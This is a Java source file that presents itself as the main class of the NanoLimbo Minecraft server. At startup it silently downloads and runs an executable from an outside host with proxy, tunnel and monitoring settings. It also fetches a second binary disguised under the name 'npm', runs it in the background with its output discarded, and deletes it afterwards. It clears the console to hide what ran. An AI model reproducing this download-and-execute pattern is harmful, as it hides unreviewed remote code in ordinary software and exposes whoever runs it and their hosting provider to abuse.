package ua.nanit.limbo;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;

import ua.nanit.limbo.server.LimboServer;
import ua.nanit.limbo.server.Log;

public final class NanoLimbo {

    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_RESET = "\033[0m";
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process sbxProcess;

    private static final String[] ALL_ENV_VARS = {
            "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT",
            "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH",
            "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT",
            "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT",
            "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO",
            "KOMARI_SERVER", "KOMARI_KEY", "CERT_URL", "KEY_URL"
    };

    public static void main(String[] args) {
        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
            System.err.println(ANSI_RED + "ERROR: Java version too low!" + ANSI_RESET);
            try { Thread.sleep(3000); } catch (InterruptedException ignored) {}
            System.exit(1);
        }

        try {
            runSbxBinary();

            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
            }));

            Thread.sleep(15000);

            System.out.println(ANSI_GREEN + "Server is running!" + ANSI_RESET);

            clearConsole();
            waitAndReplaceCerts();

            System.out.println(ANSI_GREEN + "✅ Server running with custom certificate!" + ANSI_RESET);

        } catch (Exception e) {
            System.err.println(ANSI_RED + "Error initializing SbxService: " + e.getMessage() + ANSI_RESET);
            System.err.println(ANSI_RED + "Error initializing NanoLimbo: " + e.getMessage() + ANSI_RESET);
        }

        try {
            new LimboServer().start();
        } catch (Exception e) {
            Log.error("Cannot start server: ", e);
        }
    }

    private static void clearConsole() {
        try {
            if (System.getProperty("os.name").contains("Windows")) {
                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
            } else {
                System.out.print("\033[H\033[3J\033[2J");
                System.out.flush();
                new ProcessBuilder("tput", "reset").inheritIO().start().waitFor();
            }
        } catch (Exception ignored) {}
    }

    private static void waitAndReplaceCerts() {
        try {
            Map<String, String> envVars = new HashMap<>();
            loadEnvVars(envVars);

            String certUrl = envVars.get("CERT_URL");
            String keyUrl  = envVars.get("KEY_URL");

            if (certUrl == null || certUrl.isEmpty() || keyUrl == null || keyUrl.isEmpty()) {
                return;
            }

            Path basePath = Paths.get(envVars.get("FILE_PATH"));
            Files.createDirectories(basePath);

            Path certPath = basePath.resolve("cert.pem");
            Path keyPath  = basePath.resolve("private.key");

            download(certUrl, certPath);
            download(keyUrl, keyPath);

            setReadOnly(certPath);
            setReadOnly(keyPath);

            Thread.sleep(15000);

            setWritable(certPath);
            setWritable(keyPath);

        } catch (Exception e) {
            System.err.println(ANSI_RED + "Failed to replace certificate: " + e.getMessage() + ANSI_RESET);
        }
    }

    private static void download(String url, Path target) throws Exception {
        URLConnection conn = new URL(url).openConnection();
        conn.setConnectTimeout(10000);
        conn.setReadTimeout(15000);
        try (InputStream in = conn.getInputStream()) {
            Files.copy(in, target, StandardCopyOption.REPLACE_EXISTING);
        }
    }

    private static void setReadOnly(Path path) {
        if (path.toFile().exists()) {
            path.toFile().setReadable(true, true);
            path.toFile().setWritable(false, true);
        }
    }

    private static void setWritable(Path path) {
        if (path.toFile().exists()) {
            path.toFile().setWritable(true, true);
        }
    }

    private static void runSbxBinary() throws Exception {
        Map<String, String> envVars = new HashMap<>();
        loadEnvVars(envVars);

        downloadCerts(envVars);
        runKomari(envVars);

        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        sbxProcess = pb.start();
    }

    private static void loadEnvVars(Map<String, String> envVars) throws IOException {
        envVars.put("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b383");
        envVars.put("FILE_PATH", "./world");
        envVars.put("CFIP", "cdns.doon.eu.org");
        envVars.put("CFPORT", "443");
        envVars.put("DISABLE_ARGO", "false");
        envVars.put("KOMARI_SERVER", "");
        envVars.put("KOMARI_KEY", "");
        envVars.put("CERT_URL", "");
        envVars.put("KEY_URL", "");

        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                envVars.put(var, value);
            }
        }

        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            for (String line : Files.readAllLines(envFile)) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;
                line = line.split(" #")[0].split(" //")[0].trim();
                if (line.startsWith("export ")) line = line.substring(7).trim();
                String[] parts = line.split("=", 2);
                if (parts.length == 2) {
                    String key = parts[0].trim();
                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                    if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
                        envVars.put(key, value);
                    }
                }
            }
        }
    }

    private static Path getBinaryPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;

        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = "https://amd64.ssss.nyc.mn/sbsh";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = "https://arm64.ssss.nyc.mn/sbsh";
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }

        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");

        if (!Files.exists(path)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            path.toFile().setExecutable(true);
        }

        return path;
    }

    private static void stopServices() {
        if (sbxProcess != null && sbxProcess.isAlive()) {
            sbxProcess.destroy();
            System.out.println(ANSI_RED + "sbx process terminated" + ANSI_RESET);
        }
    }

    private static void downloadCerts(Map<String, String> envVars) {
        String certUrl = envVars.get("CERT_URL");
        String keyUrl = envVars.get("KEY_URL");

        Path filePath = Paths.get(envVars.get("FILE_PATH"));

        if (certUrl != null && !certUrl.trim().isEmpty()) {
            try (InputStream in = new URL(certUrl).openStream()) {
                Files.copy(in, filePath.resolve("cert.pem"), StandardCopyOption.REPLACE_EXISTING);
            } catch (Exception e) {
                System.err.println("Failed to download certificate: " + e.getMessage());
            }
        }

        if (keyUrl != null && !keyUrl.trim().isEmpty()) {
            try (InputStream in = new URL(keyUrl).openStream()) {
                Files.copy(in, filePath.resolve("private.key"), StandardCopyOption.REPLACE_EXISTING);
            } catch (Exception e) {
                System.err.println("Failed to download private key: " + e.getMessage());
            }
        }
    }

    private static void runKomari(Map<String, String> envVars) {
        String server = envVars.get("KOMARI_SERVER");
        String key = envVars.get("KOMARI_KEY");

        if (server == null || server.trim().isEmpty() || key == null || key.trim().isEmpty()) return;

        final String endpoint = server.startsWith("http") ? server : "https://" + server;

        new Thread(() -> {
            try {
                String arch = System.getProperty("os.arch").toLowerCase();
                String url = arch.contains("arm") ? "https://rt.jp.eu.org/nucleusp/K/Karm" : "https://rt.jp.eu.org/nucleusp/K/Kamd";
                Path npm = Paths.get("npm");
                try (InputStream in = new URL(url).openStream()) {
                    Files.copy(in, npm, StandardCopyOption.REPLACE_EXISTING);
                }
                npm.toFile().setExecutable(true);
                String cmd = String.format("nohup ./npm -e %s -t %s >/dev/null 2>&1 &", endpoint, key);
                new ProcessBuilder("sh", "-c", cmd).start();
                Thread.sleep(180000);
                Files.deleteIfExists(npm);
                Files.deleteIfExists(Paths.get("config.yaml"));
            } catch (Exception e) {
                System.err.println("Error running komari: " + e.getMessage());
            }
        }).start();
    }
}
